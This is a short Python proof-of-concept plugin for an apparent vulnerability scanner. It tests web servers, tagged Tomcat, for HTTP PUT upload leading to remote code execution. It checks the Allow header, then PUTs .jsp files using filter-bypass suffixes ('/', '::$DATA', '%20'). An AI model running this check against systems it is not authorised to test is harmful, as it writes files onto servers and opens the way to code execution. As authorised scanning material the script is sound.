#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'http put'
        self.keyword = ['web', 'tomcat']
        self.info = 'http put'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)


    def prove(self):
        self.get_url()
        if self.base_url != None:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                try:
                    res = self.curl('options',path+"/testbyme")
                    allow = res.headers['Allow']
                    if 'PUT' in allow:
                        for _url in [str(int(time.time())) + '.jsp/',str(int(time.time())) + '.jsp::$DATA',str(int(time.time())) + '.jsp%20']:
                            url =  path + _url
                            res = self.curl('put', url)
                            if res.status == 201 or res.status == 204:
                                self.flag = 1
                                self.req.append({"method": "put"})
                                self.res.append({"info": url,"key":"PUT"})
                except:
                    pass
